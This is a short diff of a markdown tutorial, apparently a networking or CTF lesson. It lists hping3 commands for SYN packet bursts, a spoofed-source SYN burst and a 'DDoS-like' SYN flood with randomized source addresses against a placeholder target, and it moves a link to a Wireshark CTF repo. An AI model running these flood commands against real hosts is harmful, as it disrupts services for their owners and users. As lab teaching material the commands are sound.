@@ -45,9 +45,12 @@ hping3 -S -p 80 -c 10000 <target-ip>
 ```bash
 hping3 -S -p 80 -a 1.2.3.4 -c 10000 <target-ip>
 ```
-### I have shared an assignment of simple CTF in Wireshark which in my repo 
 
 ### 🌐DDoS-Like SYN Flood (Randomized IPs)
 ```bash
 hping3 -S --flood --rand-source -p 80 <target-ip>
+```
+### I have shared an assignment of simple CTF in Wireshark which in my Repo
+```bash 
+https://github.com/Harish5nu/Simple-CTF
 ```
